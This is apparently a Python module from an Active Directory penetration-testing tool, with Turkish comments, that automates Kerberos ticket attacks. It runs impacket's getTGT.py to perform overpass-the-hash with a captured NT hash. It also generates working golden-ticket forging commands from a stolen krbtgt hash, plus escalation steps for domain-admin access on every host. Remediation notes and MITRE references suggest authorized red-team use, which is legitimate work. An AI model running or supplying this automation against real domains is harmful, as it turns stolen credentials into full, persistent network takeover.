"""Kerberos bilet yönetimi: overpass-the-hash (getTGT) + golden/silver ticket (opt-in).

Elde edilen NT hash'lerden bilet üretmeyi otomatikleştirir:
  * overpass-the-hash: NT hash -> TGT (getTGT.py) -> ccache ile -k akışları.
  * golden ticket: krbtgt hash ele geçtiyse (DCSync sonrası) sınırsız TGT komutu.
  * silver ticket: servis hesabı hash'i varsa doğrudan servise bilet.

getTGT/ticketer impacket'e bağlıdır; bozuksa (bkz. --check) PLAN üretir.
"""

from __future__ import annotations

import re

from ..findings import Finding, ScanReport, Severity
from ..runner import CommandResult, resolve_impacket, run, strip_dryrun


def scan(ctx, *, timeout=180):
    # overpass-the-hash: ctx kimliği NT hash ise TGT iste
    if ctx.username and ctx.nthash and ctx.domain and not ctx.dry_run:
        gt = resolve_impacket("getTGT.py")
        if gt:
            argv = [gt, "-hashes", f":{ctx.nthash}",
                    f"{ctx.domain}/{ctx.username}"]
            res = run(argv, tool="tickets-gettgt", timeout=timeout,
                      cwd=ctx.outdir or None)
            return [res]
    return [CommandResult(tool="tickets:plan", argv=[], returncode=0,
                          stdout="[PLAN] bilet üretimi için NT hash + domain gerekir "
                                 "(overpass-the-hash) ya da krbtgt (golden).",
                          stderr="", duration=0.0)]


_TGT_OK = re.compile(r"Saving ticket in (\S+\.ccache)", re.IGNORECASE)


def parse(results: list[CommandResult], report: ScanReport) -> None:
    report.raw_outputs["tickets"] = "\n\n".join(r.combined for r in results)
    combined = strip_dryrun("\n\n".join(r.combined for r in results))
    target = report.target
    dom = report.domain or "<domain>"

    m = _TGT_OK.search(combined)
    if m:
        report.add(Finding(
            title="Overpass-the-hash: NT hash'ten TGT alındı (ccache)",
            severity=Severity.HIGH, target=target, source="tickets",
            control_id="kerberos.overpth", mitre="T1550.002",
            reference="Overpass-the-Hash / Pass-the-Key",
            description="NT hash kullanılarak Kerberos TGT elde edildi; artık '-k' ile "
                        "Kerberos tabanlı araçlar (certipy/bloodyAD/secretsdump) kullanılabilir.",
            evidence=f"ccache: {m.group(1)}",
            remediation="Ele geçirilen hesabın parolasını sıfırla.",
            poc=f"getTGT.py -hashes :<nt> {dom}/<user>  ->  export KRB5CCNAME=<user>.ccache",
            escalation="export KRB5CCNAME=<ccache> -> 'nxc smb <dc> -k' / 'certipy ... -k'."))

    # Golden ticket: krbtgt hash'i kimlik havuzunda mı?
    krbtgt = next((c for c in report.credentials
                   if c.username.lower() == "krbtgt" and c.kind == "nthash"), None)
    if krbtgt:
        from .. import config
        nt = krbtgt.secret if not config.REDACT else "<krbtgt_nt>"
        report.add(Finding(
            title="Golden Ticket üretilebilir — krbtgt NT hash elde edildi",
            severity=Severity.CRITICAL, target=target, source="tickets",
            control_id="kerberos.golden", mitre="T1558.001",
            reference="Golden Ticket (krbtgt)",
            description="krbtgt hash'i ele geçirildi; herhangi bir kullanıcı/grup için "
                        "sınırsız geçerli TGT üretilebilir — tam ve kalıcı domain kontrolü.",
            evidence="krbtgt NT hash mevcut (kimlik havuzunda)",
            remediation="krbtgt parolasını İKİ KEZ sıfırla (mevcut golden ticket'ları geçersiz kılar).",
            poc=f"{resolve_impacket('ticketer.py') or 'ticketer.py'} -nthash {nt} "
                f"-domain-sid <SID> -domain {dom} Administrator",
            escalation="export KRB5CCNAME=Administrator.ccache -> her host'a DA; "
                       "domain-sid: 'nxc smb <dc> -u <u> -p <p> --rid-brute' ya da 'lookupsid.py'."))


# ---------------------------------------------------------------------------
from ..registry import ScanContext, ScanModule  # noqa: E402


def _run(ctx: ScanContext) -> list[CommandResult]:
    return scan(ctx, timeout=ctx.timeout)


MODULE = ScanModule(
    name="tickets",
    label="Kerberos bilet üretimi: overpass-the-hash + golden/silver (opt-in)",
    run=_run,
    parse=parse,
    requires_creds=True,
    optin=True,
)
